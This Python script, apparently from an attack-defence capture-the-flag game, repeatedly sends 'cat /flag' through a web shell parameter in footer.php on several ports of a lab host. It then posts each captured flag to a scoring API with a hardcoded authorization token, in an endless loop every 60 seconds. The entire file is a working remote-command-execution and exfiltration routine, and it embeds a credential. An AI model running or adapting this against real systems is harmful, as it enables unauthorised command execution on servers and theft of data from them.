#!/usr/bin/env python
# -*- coding:utf-8 -*-
import json
import requests
from requests.exceptions import RequestException
import time


def get_flag():
    url = "http://192.168.15.80:"
    for i in [8801, 8803, 8804, 8805, 8806]:
        time.sleep(1)
        try:
            tmp = url + str(i) + "/footer.php"
            result = requests.post(tmp, data={'shell': 'cat /flag'}, timeout=2)
            flag_text = result.text
        except RequestException as e:
            print(e)
            print(tmp + '-->Fails!')
        try:
            print(flag_text)
            flag_url = 'http://192.168.15.80:19999/api/flag'
            flag_header = {
                # "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
                # "Accept": "application/json, text/plain, */*",
                # "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                # "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/json;charset=utf-8",
                "Authorization": "1b1fae078083811a61e7794e8320755b",
                # "Cookie": "PHPSESSID=8sglq54nehb43j50rc48e9r6r6"
            }
            flag_data = {"flag": flag_text}
            fd = json.dumps(flag_data)
            tmp2 = requests.post(flag_url, data=fd, headers=flag_header)
        except RequestException as ee:
            print("error:")
            print(ee)
    return 0


if __name__ == "__main__":
    while 1:
        get_flag()
        time.sleep(60)
